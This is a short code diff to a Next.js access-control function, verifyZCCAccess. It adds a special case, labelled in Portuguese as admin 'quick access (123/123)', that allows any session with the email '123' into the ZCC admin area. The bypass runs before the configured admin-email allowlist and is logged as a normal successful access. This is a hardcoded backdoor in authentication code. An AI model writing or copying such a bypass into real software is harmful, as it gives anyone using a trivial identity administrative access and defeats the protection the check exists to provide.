@@ -312,6 +312,12 @@ export async function verifyZCCAccess(request: NextRequest): Promise<ZCCSecurity
       secret: nextAuthSecret,
     });
     if (token?.email) {
+      // ZCC Admin quick access (123/123): email "123" sempre tem acesso ao ZCC
+      if (token.email === '123') {
+        addAuditEntry({ ip, userAgent, method: 'session', success: true, path: pathname });
+        return { allowed: true, ip };
+      }
+
       const adminEmails = (process.env.ZCC_ADMIN_EMAILS || '')
         .split(',')
         .map(e => e.trim().toLowerCase())
